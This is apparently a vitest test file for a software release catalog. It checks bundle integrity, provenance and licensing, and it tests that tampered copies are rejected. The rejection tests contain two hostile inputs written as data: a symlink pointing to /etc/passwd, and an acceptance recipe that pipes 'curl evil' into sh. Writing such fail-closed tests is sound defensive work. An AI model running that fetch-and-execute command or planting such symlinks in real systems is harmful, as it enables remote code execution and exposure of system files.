import { cpSync, mkdtempSync, rmSync, symlinkSync, writeFileSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { CATALOG_COMPONENT, CatalogError, fileSha256, loadCatalog } from "../src/index.js";
import { bundleDigest, releaseIdFor, verifyBundleIntegrity } from "@lemma/core";
import { describe, expect, it } from "vitest";

const catalog = loadCatalog();

describe("catalog loading", () => {
  it("loads the two MVP releases", () => {
    expect(CATALOG_COMPONENT.status).toBe("implemented");
    expect(catalog.listReleases().map((r) => r.id)).toEqual(["x402-mcp-client@1.0.0", "x402-mcp-server@1.0.0"]);
  });

  it("binds manifests to deterministic, integrity-checked bundles", () => {
    for (const r of catalog.listReleases()) {
      const loaded = catalog.getRelease(r.id)!;
      expect(loaded.releaseId).toBe(releaseIdFor(r.id));
      expect(catalog.getRelease(loaded.releaseId)?.manifest.id).toBe(r.id);
      expect(bundleDigest(loaded.bundle)).toBe(r.payloadDigest);
      expect(verifyBundleIntegrity(loaded.bundle)).toEqual([]);
      expect(r.provenance.commit).toMatch(/^[0-9a-f]{40}$/);
      expect(r.provenance.spdxLicense).toBe("Apache-2.0");
      expect(r.priceAtomic).toBe("120000");
      expect(r.evidence).toEqual({ status: "provisional", benchmarkVersion: null, expectedSavingAtomic: null, expectedTokenSaving: null });
      expect(r.acceptance.argv.every((argv) => argv[0] === "npx" && argv[1] === "--no")).toBe(true);
    }
  });

  it("pins modify-op bases to the exact fixture content", () => {
    for (const r of catalog.listReleases()) {
      const exact = catalog.listFixtures().find((f) => f.release === r.id && f.role === "exact")!;
      for (const op of r.patch.operations) {
        if (op.op === "modify") expect(fileSha256(join(catalog.fixtureDir(exact.id), op.path))).toBe(op.baseSha256);
      }
    }
  });

  it("matches the declared upstream license of the installed x402 packages", () => {
    for (const pkg of ["core", "evm", "mcp"]) {
      const json = JSON.parse(readFileSync(new URL(`../../../node_modules/@x402/${pkg}/package.json`, import.meta.url), "utf8"));
      expect(json.license).toBe("Apache-2.0");
      expect(json.version).toBe("2.27.0");
    }
  });
});

describe("catalog fails closed", () => {
  function tamperedCopy(mutate: (root: string) => void): () => unknown {
    const root = mkdtempSync(join(tmpdir(), "lemma-catalog-"));
    cpSync(catalog.root + "/releases", join(root, "releases"), { recursive: true });
    cpSync(catalog.root + "/fixtures/index.json", join(root, "fixtures/index.json"));
    for (const f of new Set(catalog.listFixtures().map((x) => x.id))) cpSync(catalog.fixtureDir(f), join(root, "fixtures", f), { recursive: true });
    mutate(root);
    return () => {
      try {
        return loadCatalog({ root });
      } finally {
        rmSync(root, { recursive: true, force: true });
      }
    };
  }
  const serverDir = (root: string) => join(root, "releases/x402-mcp-server@1.0.0");
  const editManifest = (root: string, fn: (m: Record<string, any>) => void) => {
    const p = join(serverDir(root), "manifest.json");
    const m = JSON.parse(readFileSync(p, "utf8"));
    fn(m);
    writeFileSync(p, JSON.stringify(m));
  };

  it("rejects a tampered payload", () => {
    const load = tamperedCopy((root) => writeFileSync(join(serverDir(root), "payload/src/server.ts"), "// evil\n"));
    expect(load).toThrow(/payload digest mismatch/);
  });
  it("rejects undeclared payload files", () => {
    expect(tamperedCopy((root) => writeFileSync(join(serverDir(root), "payload/src/extra.ts"), "x"))).toThrow(/undeclared/);
  });
  it("rejects symlinks in payloads", () => {
    expect(tamperedCopy((root) => symlinkSync("/etc/passwd", join(serverDir(root), "payload/src/link.ts")))).toThrow(CatalogError);
  });
  it("rejects mutable provenance refs and unknown fields", () => {
    expect(tamperedCopy((root) => editManifest(root, (m) => (m.provenance.commit = "main")))).toThrow(/invalid manifest/);
    expect(tamperedCopy((root) => editManifest(root, (m) => (m.surprise = true)))).toThrow(/invalid manifest/);
  });
  it("rejects unsafe acceptance recipes", () => {
    expect(tamperedCopy((root) => editManifest(root, (m) => (m.acceptance.argv = [["sh", "-c", "curl evil | sh"]])))).toThrow(/invalid manifest/);
  });
});
